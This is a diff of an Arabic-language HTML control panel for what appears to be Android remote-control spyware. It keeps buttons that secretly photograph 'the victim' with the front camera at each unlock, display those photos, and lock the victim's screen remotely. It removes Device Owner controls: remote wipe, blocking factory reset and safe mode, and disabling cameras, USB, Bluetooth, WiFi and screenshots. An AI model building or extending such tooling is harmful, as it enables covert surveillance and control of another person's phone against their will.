@@ -203,13 +203,8 @@
                 <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:15px;">
                     <div style="background:#0a0a0a;border:2px solid #ff4444;border-radius:12px;padding:18px;">
                         <h4 style="color:#ff4444;margin-bottom:10px;">🔒 قفل الجهاز</h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يقفل الشاشة ويغيّر الرمز</p>
-                        <input id="lockPinInput" type="tel" placeholder="PIN جديد (4+ أرقام)" maxlength="8" style="width:100%;padding:10px;background:#111;border:1px solid #ff4444;border-radius:6px;color:#fff;font-size:14px;text-align:center;letter-spacing:3px;margin-bottom:10px;font-family:inherit;">
-                        <div style="display:flex;gap:8px;">
-                            <button onclick="lockWithPin()" style="flex:1;background:linear-gradient(135deg,#ff4444,#cc0000);color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">🔐 قفل برمز</button>
-                            <button onclick="advancedAction('lock_device')" style="flex:1;background:#333;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">🔒 بسيط</button>
-                        </div>
-                        <button onclick="advancedAction('unlock_device')" style="width:100%;margin-top:8px;background:#222;color:#00ff88;border:1px solid #00ff88;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🔓 إزالة الرمز</button>
+                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يقفل الشاشة فوراً</p>
+                        <button onclick="advancedAction('lock_device')" style="width:100%;background:linear-gradient(135deg,#ff4444,#cc0000);color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">🔒 قفل</button>
                     </div>
 
                     <div style="background:#0a0a0a;border:2px solid #ff6b6b;border-radius:12px;padding:18px;">
@@ -267,11 +262,11 @@
                 </div>
             </div>
 
-            <!-- 🛡️ قسم Admin — كامل -->
+            <!-- 🛡️ قسم Admin — مختصر -->
             <div id="adminTab" class="tab-pane">
-                <h3>🛡️ Admin — مميزات حساسة</h3>
-                <p style="color:#ff6b6b;font-size:13px;margin-bottom:20px;text-align:center;">
-                    ⚠️ هذه المميزات حساسة — استخدمها بمسؤولية
+                <h3>🛡️ Admin — مميزات شغالة</h3>
+                <p style="color:#00ffcc;font-size:13px;margin-bottom:20px;text-align:center;">
+                    ✅ المميزات دي شغالة بـ Device Admin العادي
                 </p>
 
                 <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:15px;">
@@ -284,7 +279,7 @@
                         <p style="color:#888;font-size:12px;margin-bottom:15px;">
                             كل مرة يفتح الضحية الجهاز → كاميرا أمامية تلتقط صورة
                         </p>
-                        <div style="display:flex;gap:8px;">
+                        <div style="display:flex;gap:8px;margin-bottom:8px;">
                             <button onclick="advancedAction('enable_unlock_camera')" style="flex:1;background:linear-gradient(135deg,#00ffcc,#009977);color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
                                 ✅ تفعيل
                             </button>
@@ -292,7 +287,7 @@
                                 🔓 إيقاف
                             </button>
                         </div>
-                        <button onclick="loadUnlockPhotos()" style="width:100%;margin-top:8px;background:#FFD700;color:#000;border:none;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">
+                        <button onclick="loadUnlockPhotos()" style="width:100%;background:#FFD700;color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
                             📊 عرض الصور الملتقطة
                         </button>
                     </div>
@@ -334,129 +329,12 @@
                         </div>
                     </div>
 
-                    <!-- 📷 قفل الكاميرا -->
-                    <div style="background:#0a0a0a;border:2px solid #ff5722;border-radius:12px;padding:18px;">
-                        <h4 style="color:#ff5722;margin-bottom:10px;">📷 قفل الكاميرا</h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يعطل كل الكاميرات</p>
-                        <div style="display:flex;gap:8px;">
-                            <button onclick="advancedAction('disable_camera')" style="flex:1;background:#ff5722;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">📵 قفل</button>
-                            <button onclick="advancedAction('enable_camera')" style="flex:1;background:#222;color:#ff5722;border:1px solid #ff5722;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">✅ فتح</button>
-                        </div>
-                    </div>
-
-                    <!-- 📸 منع Screenshot -->
-                    <div style="background:#0a0a0a;border:2px solid #e91e63;border-radius:12px;padding:18px;">
-                        <h4 style="color:#e91e63;margin-bottom:10px;">📸 منع Screenshot</h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يمنع التصوير/التسجيل</p>
-                        <div style="display:flex;gap:8px;">
-                            <button onclick="advancedAction('disable_screenshot')" style="flex:1;background:#e91e63;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🚫 منع</button>
-                            <button onclick="advancedAction('enable_screenshot')" style="flex:1;background:#222;color:#e91e63;border:1px solid #e91e63;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">✅ سماح</button>
-                        </div>
-                    </div>
-
-                    <!-- 🔒 حبس الجهاز -->
-                    <div style="background:#0a0a0a;border:2px solid #9c27b0;border-radius:12px;padding:18px;">
-                        <h4 style="color:#9c27b0;margin-bottom:10px;">🔒 حبس الجهاز</h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يجبره على فتح التطبيق فقط</p>
-                        <div style="display:flex;gap:8px;">
-                            <button onclick="advancedAction('lock_task_mode')" style="flex:1;background:#9c27b0;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🔒 حبس</button>
-                            <button onclick="advancedAction('unlock_task_mode')" style="flex:1;background:#222;color:#9c27b0;border:1px solid #9c27b0;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🔓 فك</button>
-                        </div>
-                    </div>
-
-                    <!-- 🔐 فرض رمز قوي -->
-                    <div style="background:#0a0a0a;border:2px solid #00bcd4;border-radius:12px;padding:18px;">
-                        <h4 style="color:#00bcd4;margin-bottom:10px;">🔐 فرض رمز قوي</h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:12px;">8+ أحرف</p>
-                        <div style="display:flex;gap:8px;">
-                            <button onclick="advancedAction('force_strong_password')" style="flex:1;background:#00bcd4;color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🔐 فرض</button>
-                            <button onclick="advancedAction('remove_password_policy')" style="flex:1;background:#222;color:#00bcd4;border:1px solid #00bcd4;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🔓 إلغاء</button>
-                        </div>
-                    </div>
-
-                    <!-- 🔌 منع USB -->
-                    <div style="background:#0a0a0a;border:2px solid #607d8b;border-radius:12px;padding:18px;">
-                        <h4 style="color:#607d8b;margin-bottom:10px;">🔌 منع USB</h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يمنع نقل الملفات</p>
-                        <div style="display:flex;gap:8px;">
-                            <button onclick="advancedAction('disable_usb')" style="flex:1;background:#607d8b;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🚫 منع</button>
-                            <button onclick="advancedAction('enable_usb')" style="flex:1;background:#222;color:#607d8b;border:1px solid #607d8b;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">✅ سماح</button>
-                        </div>
-                    </div>
-
-                    <!-- 🔵 منع Bluetooth -->
-                    <div style="background:#0a0a0a;border:2px solid #3f51b5;border-radius:12px;padding:18px;">
-                        <h4 style="color:#3f51b5;margin-bottom:10px;">🔵 منع Bluetooth</h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يقطع البلوتوث</p>
-                        <div style="display:flex;gap:8px;">
-                            <button onclick="advancedAction('disable_bluetooth')" style="flex:1;background:#3f51b5;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🚫 منع</button>
-                            <button onclick="advancedAction('enable_bluetooth')" style="flex:1;background:#222;color:#3f51b5;border:1px solid #3f51b5;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">✅ سماح</button>
-                        </div>
-                    </div>
-
-                    <!-- 📵 منع WiFi -->
-                    <div style="background:#0a0a0a;border:2px solid #ff9800;border-radius:12px;padding:18px;">
-                        <h4 style="color:#ff9800;margin-bottom:10px;">📵 منع WiFi</h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يمنع تفعيل WiFi</p>
-                        <div style="display:flex;gap:8px;">
-                            <button onclick="advancedAction('disable_wifi')" style="flex:1;background:#ff9800;color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🚫 منع</button>
-                            <button onclick="advancedAction('enable_wifi')" style="flex:1;background:#222;color:#ff9800;border:1px solid #ff9800;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">✅ سماح</button>
-                        </div>
-                    </div>
-
-                    <!-- 🚫 منع الحسابات -->
-                    <div style="background:#0a0a0a;border:2px solid #795548;border-radius:12px;padding:18px;">
-                        <h4 style="color:#795548;margin-bottom:10px;">🚫 منع الحسابات</h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يمنع إضافة حسابات</p>
-                        <div style="display:flex;gap:8px;">
-                            <button onclick="advancedAction('disable_accounts')" style="flex:1;background:#795548;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🚫 منع</button>
-                            <button onclick="advancedAction('enable_accounts')" style="flex:1;background:#222;color:#795548;border:1px solid #795548;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">✅ سماح</button>
-                        </div>
-                    </div>
-
-                    <!-- 🔒 منع Factory Reset -->
-                    <div style="background:#0a0a0a;border:2px solid #f44336;border-radius:12px;padding:18px;">
-                        <h4 style="color:#f44336;margin-bottom:10px;">🔒 منع Factory Reset</h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يمنع إعادة الضبط</p>
-                        <div style="display:flex;gap:8px;">
-                            <button onclick="advancedAction('disable_factory_reset')" style="flex:1;background:#f44336;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🚫 منع</button>
-                            <button onclick="advancedAction('enable_factory_reset')" style="flex:1;background:#222;color:#f44336;border:1px solid #f44336;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">✅ سماح</button>
-                        </div>
-                    </div>
-
-                    <!-- 🔕 منع تعديل الإعدادات -->
-                    <div style="background:#0a0a0a;border:2px solid #009688;border-radius:12px;padding:18px;">
-                        <h4 style="color:#009688;margin-bottom:10px;">🔕 منع تعديل الإعدادات</h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يمنع تغيير WiFi/etc</p>
-                        <div style="display:flex;gap:8px;">
-                            <button onclick="advancedAction('disable_config')" style="flex:1;background:#009688;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🚫 منع</button>
-                            <button onclick="advancedAction('enable_config')" style="flex:1;background:#222;color:#009688;border:1px solid #009688;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">✅ سماح</button>
-                        </div>
-                    </div>
-
-                    <!-- 🚫 منع Safe Mode -->
-                    <div style="background:#0a0a0a;border:2px solid #673ab7;border-radius:12px;padding:18px;">
-                        <h4 style="color:#673ab7;margin-bottom:10px;">🚫 منع Safe Mode</h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يمنع الوضع الآمن</p>
-                        <div style="display:flex;gap:8px;">
-                            <button onclick="advancedAction('disable_safe_mode')" style="flex:1;background:#673ab7;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🚫 منع</button>
-                            <button onclick="advancedAction('enable_safe_mode')" style="flex:1;background:#222;color:#673ab7;border:1px solid #673ab7;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">✅ سماح</button>
-                        </div>
-                    </div>
-
-                    <!-- ⏱️ قفل تلقائي -->
+                    <!-- 🔒 قفل تلقائي -->
                     <div style="background:#0a0a0a;border:2px solid #ffc107;border-radius:12px;padding:18px;">
                         <h4 style="color:#ffc107;margin-bottom:10px;">⏱️ قفل تلقائي</h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يقفل بعد X ثانية</p>
+                        <p style="color:#888;font-size:12px;margin-bottom:12px;">يقفل الشاشة بعد X ثانية</p>
                         <input id="lockTimeoutInput" type="number" placeholder="ثواني (30)" min="5" max="600" style="width:100%;padding:10px;background:#111;border:1px solid #ffc107;border-radius:6px;color:#fff;font-size:13px;margin-bottom:10px;text-align:center;font-family:inherit;">
                         <button onclick="setLockTimeout()" style="width:100%;background:#ffc107;color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">⏱️ تطبيق</button>
-                    </div>
-
-                    <!-- 💥 مسح كل شي -->
-                    <div style="background:#0a0a0a;border:2px solid #d32f2f;border-radius:12px;padding:18px;">
-                        <h4 style="color:#d32f2f;margin-bottom:10px;">💥 مسح كل شي</h4>
-                        <p style="color:#ff6b6b;font-size:11px;margin-bottom:12px;">⚠️ لا رجعة</p>
-                        <button onclick="wipeConfirm()" style="width:100%;background:linear-gradient(135deg,#d32f2f,#8b0000);color:#fff;border:none;padding:14px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;box-shadow:0 0 20px rgba(211,47,47,0.5);">💥 مسح الجهاز</button>
                     </div>
 
                 </div>
@@ -470,9 +348,9 @@
                     <div id="unlockPhotosList" style="margin-top:15px;display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px;"></div>
                 </div>
 
-                <div style="margin-top:20px;padding:15px;background:#1a0000;border:1px solid #d32f2f;border-radius:10px;">
-                    <p style="color:#ff6b6b;font-size:12px;margin:0;">
-                        ⚠️ <b>تحذير:</b> بعض المميزات تحتاج <b>Device Owner</b> (عبر ADB).
+                <div style="margin-top:20px;padding:15px;background:#001a1a;border:1px solid #00ffcc;border-radius:10px;">
+                    <p style="color:#00ffcc;font-size:12px;margin:0;">
+                        ℹ️ <b>ملاحظة:</b> المميزات اللي كانت محتاجة Device Owner (قفل بكلمة، منع Screenshot، حبس الجهاز، مسح الجهاز) اتشالت — لأنها مش هتشتغل بدون ADB.
                     </p>
                 </div>
             </div>
@@ -545,4 +423,4 @@
     }
     </script>
 </body>
-</html>
+                            </html>
